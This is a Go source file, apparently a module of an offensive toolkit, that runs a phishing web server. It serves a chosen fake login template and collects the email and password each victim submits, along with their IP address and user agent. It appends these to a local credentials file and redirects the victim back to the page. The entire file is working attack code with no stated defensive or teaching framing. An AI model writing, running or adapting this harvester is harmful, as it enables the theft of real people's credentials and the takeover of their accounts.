package phishing

import (
	"fmt"
	"html/template"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"time"
)

func Launch(templateName string, port int) {
	basePath := filepath.Join("modules", "phishing", "templates", templateName)
	indexFile := filepath.Join(basePath, "index.html")

	if _, err := os.Stat(indexFile); os.IsNotExist(err) {
		fmt.Printf("[!] Template '%s' does not exist.\n", templateName)
		return
	}

	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		tmpl, err := template.ParseFiles(indexFile)
		if err != nil {
			http.Error(w, "Failed to load template", 500)
			return
		}
		tmpl.Execute(w, nil)
	})

	http.HandleFunc("/log", func(w http.ResponseWriter, r *http.Request) {
		if r.Method == http.MethodPost {
			r.ParseForm()
			email := r.FormValue("email")
			pass := r.FormValue("pass")
			ip := r.RemoteAddr
			ua := r.UserAgent()
			logEntry := fmt.Sprintf("[%s] IP: %s | UA: %s\nUser: %s | Pass: %s\n\n",
				time.Now().Format(time.RFC3339), ip, ua, email, pass)

			f, err := os.OpenFile("phishing_creds.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
			if err == nil {
				defer f.Close()
				io.WriteString(f, logEntry)
			}
		}
		http.Redirect(w, r, "/", http.StatusSeeOther)
	})

	fmt.Printf("[+] Phishing server '%s' running at http://0.0.0.0:%d\n", templateName, port)
	http.ListenAndServe(fmt.Sprintf(":%d", port), nil)
}
